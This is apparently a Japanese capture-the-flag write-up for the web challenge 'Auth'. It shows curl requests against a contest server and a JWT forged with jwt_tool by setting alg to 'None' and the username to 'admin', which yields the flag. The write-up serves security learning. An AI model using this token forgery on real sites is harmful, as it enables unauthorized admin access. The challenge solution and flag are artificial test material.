# Auth:WEB:288pts
I just started learning about a new authentication method called JWT. This is my first website with it, could you check if its secure?  

[213.133.103.186:6477](213.133.103.186:6477)  

# Solution
Webサイトのアドレスが渡される。  
アクセスしようとすると、Basic認証がかかっておりログインできない。  
```bash
$ curl http://213.133.103.186:6477 -I
HTTP/1.1 401 Unauthorized
X-Powered-By: Express
WWW-Authenticate: Basic realm="Authorization Required"
Content-Type: text/html; charset=utf-8
Content-Length: 23
ETag: W/"17-68YDcup1nD43NOnf7nEMd8Uly4A"
Date: Sun, 09 Apr 2023 07:16:02 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```
適当なユーザ名とパスワードでログインを試みたところ失敗し、以下のように表示された。  
```bash
$ curl http://213.133.103.186:6477 -H "Authorization: Basic `echo -n 'satoki:satoki'|base64`"
Wrong username or password; register using /register and the username and password params
```
`/register`で登録できるようだ。  
```bash
$ curl 'http://213.133.103.186:6477/register?username=satoki&password=satoki'
User created
```
ユーザ作成が完了したようなので、ログインを再度試みる。  
```bash
$ curl http://213.133.103.186:6477 -H "Authorization: Basic `echo -n 'satoki:satoki'|base64`"
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNhdG9raSIsImlhdCI6MTY4MTAyNDY2OH0.Q5to3cWoxICGvFRVtRP03pJ5Y1mGrIxZfYggMzywxoA
$ echo 'eyJ1c2VybmFtZSI6InNhdG9raSIsImlhdCI6MTY4MTAyNDY2OH0' | base64 -d
{"username":"satoki","iat":1681024668}base64: invalid input
```
ユーザ名が含まれた、jwtが表示された。  
これを用いて、Bearer認証でのログインを試みるが失敗する。  
どうすればよいか分からずいろいろと探しているとレスポンスヘッダに奇妙なものがあることに気付く。  
```bash
$ curl http://213.133.103.186:6477 -H "Authorization: Basic `echo -n 'satoki:satoki'|base64`" -I
HTTP/1.1 200 OK
X-Powered-By: Express
Info: check /info
Content-Type: text/html; charset=utf-8
Content-Length: 132
ETag: W/"84-4iBBJ+cRJUvfEGcDzqX1LGP6GyE"
Date: Sun, 09 Apr 2023 07:19:37 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```
`Info: check /info`なる謎のモノが入っている。  
言われた通り`/info`にアクセスしてみる。  
```bash
$ curl http://213.133.103.186:6477/info -H "Authorization: Basic `echo -n 'satoki:satoki'|base64`"
check the /validate route; use token as the query param
```
`/validate`の`token`クエリパラメータを使えと言われた。  
先ほど得られたjwtを用いてリクエストを送る。  
```bash
$ curl 'http://213.133.103.186:6477/validate?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNhdG9raSIsImlhdCI6MTY4MTAyNDY2OH0.Q5to3cWoxICGvFRVtRP03pJ5Y1mGrIxZfYggMzywxoA'
only the admin account has permissions to access the flag
```
adminのみフラグが得られるようだ。  
ユーザ名を書き換える必要があるため、jwtのよくあるNoneを使った攻撃であると予測する。  
以下の通り[jwt_tool](https://github.com/ticarpi/jwt_tool)を用いる(一部省略)。  
```bash
$ git clone https://github.com/ticarpi/jwt_tool.git
$ cd jwt_tool/
$ python jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNhdG9raSIsImlhdCI6MTY4MTAyNDY2OH0.Q5to3cWoxICGvFRVtRP03pJ5Y1mGrIxZfYggMzywxoA -T
~~~
Token header values:
[1] alg = "HS256"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of alg is: HS256
Please enter new value and hit ENTER
> None
[1] alg = "None"
[2] typ = "JWT"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] username = "satoki"
[2] iat = 1681024668    ==> TIMESTAMP = 2023-04-09 16:17:48 (UTC)
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[5] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of username is: satoki
Please enter new value and hit ENTER
> admin
[1] username = "admin"
[2] iat = 1681024668    ==> TIMESTAMP = 2023-04-09 16:17:48 (UTC)
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[5] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
Signature unchanged - no signing method specified (-S or -X)
jwttool_c1d4af93e89d3a85a6478737d5d9167a - Tampered token:
[+] eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjgxMDI0NjY4fQ.Q5to3cWoxICGvFRVtRP03pJ5Y1mGrIxZfYggMzywxoA
```
得られた改竄済みjwtを送信する。  
```bash
$ curl 'http://213.133.103.186:6477/validate?token=eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjgxMDI0NjY4fQ.Q5to3cWoxICGvFRVtRP03pJ5Y1mGrIxZfYggMzywxoA'
bucket{1_l0v3_jwt!!!1!!!!1!!!!!1111!}
```
flagが表示された。  

## bucket{1_l0v3_jwt!!!1!!!!1!!!!!1111!}